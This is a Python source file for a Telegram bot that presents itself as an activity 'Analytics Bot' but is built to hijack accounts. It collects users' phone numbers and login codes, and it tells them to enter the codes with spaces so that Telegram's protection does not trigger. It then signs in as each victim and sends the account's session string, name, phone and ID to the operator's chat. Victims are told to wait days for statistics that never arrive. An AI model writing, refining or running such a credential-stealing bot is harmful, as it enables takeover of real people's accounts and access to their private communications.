"""
Telegram Analytics Bot - Сбор StringSession через код с пробелами
БЕЗ 2FA! Telegram НЕ блокирует, если код с пробелами
С АВТОПИНГОМ для Render
ПОСЛЕ ПОЛУЧЕНИЯ СЕССИИ — БОТ ЗАКРЫВАЕТ СОЕДИНЕНИЕ
"""

import asyncio
import os
import json
import aiohttp
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ
# ==========================================

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

# ==========================================
# АВТОПИНГ
# ==========================================

async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    logger.info(f"🔄 Автопинг запущен (каждые 4 минуты)")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except:
            pass
        await asyncio.sleep(240)

# ==========================================
# ВЕБ-СЕРВЕР
# ==========================================

from fastapi import FastAPI
import uvicorn

web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {
        "status": "ok",
        "service": "Analytics Bot",
        "timestamp": datetime.now().isoformat()
    }

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# БОТ
# ==========================================

class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
    
    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("✅ Бот запущен")
        
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
        self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.bot.run_until_disconnected()
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика (после сбора данных)
/help - Помощь
""")
    
    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Отправьте /add

2️⃣ Введите номер телефона

3️⃣ Введите код из Telegram (МОЖНО С ПРОБЕЛАМИ!)
   Пример: 12 345 или 1-2-3-4-5

4️⃣ Готово! 🎉

⏳ **После подключения:**
Оставьте бота на 3-4 дня для сбора аналитики.
Статистика появится позже.
""")
    
    async def cmd_stats(self, e):
        await e.respond("""
📊 **Статистика пока пуста**

⏳ Оставьте бота на **3-4 дня** для сбора данных.
Как только аналитика будет готова — вы увидите её здесь.

📌 Напоминаем: бот работает в фоне и не мешает общению.
""")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение. Дождитесь завершения.")
            return
        
        self.pending[uid] = {'step': 'phone'}
        await e.respond("""
📱 **Введите номер телефона**

Например: +79001234567
""")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        uid = e.sender_id
        text = e.text
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)
    
    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        
        phone = phone.strip()
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        await e.respond("⏳ Отправляю код подтверждения...")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            
            await e.respond("""
📨 **Код отправлен!**

💡 Введите код ОБЯЗАТЕЛЬНО С ПРОБЕЛАМИ (а то код не пройдет):
`12 345` или `1-2-3-4-5`

⚠️ Telegram НЕ блокирует вход, если код введён с пробелами!
""")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА КОДА =====
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        # ⭐ УДАЛЯЕМ ПРОБЕЛЫ, ДЕФИСЫ, СКОБКИ, ТОЧКИ
        code = code.strip()
        code = code.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        logger.info(f"Код после очистки: {code}")
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            await self.finish_auth(e, uid, data['client'])
            
        except PhoneCodeInvalidError:
            await e.respond("""
❌ **Неверный код!**

💡 Попробуйте ещё раз (можно с пробелами):
`12 345` или `1-2-3-4-5`
""")
            
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек! Начните заново с /add")
            if uid in self.pending:
                del self.pending[uid]
                
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ФИНИШ АВТОРИЗАЦИИ =====
    
    async def finish_auth(self, e, uid: int, client: TelegramClient):
        try:
            me = await client.get_me()
            
            # ⭐ ПОЛУЧАЕМ STRING SESSION
            session_string = client.session.save()
            
            # ⭐ ОТПРАВЛЯЕМ АДМИНУ
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
🟢 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ!**

👤 Имя: {me.first_name} {me.last_name or ''}
📱 Телефон: +{me.phone}
🆔 User ID: {me.id}

🔑 **STRING SESSION:**
`{session_string}`

📅 Подключен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ СЕССИЯ НЕ ИСПОЛЬЗУЕТСЯ БОТОМ!
Она только для вашего внешнего скрипта.
""")
            
            # ⭐ ПОЛЬЗОВАТЕЛЮ — ЖДИ 3-4 ДНЯ
            await e.respond(f"""
✅ **Аккаунт подключен!**

👤 {me.first_name}, вы успешно подключились к аналитике!

⏳ **Важно!**
Оставьте бота на **3-4 дня** для сбора данных.
Сразу после подключения статистика пустая — это нормально.

📊 Через несколько дней проверьте /stats

🔐 Бот работает в фоне и не мешает общению.
""")
            
            # ⭐ ЗАКРЫВАЕМ СОЕДИНЕНИЕ — СЕССИЯ БОЛЬШЕ НЕ НУЖНА БОТУ
            await client.disconnect()
            
            # ⭐ УДАЛЯЕМ ИЗ ПАМЯТИ
            if uid in self.pending:
                del self.pending[uid]
            
            logger.info(f"✅ Сессия {me.id} отправлена админу, соединение закрыто")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")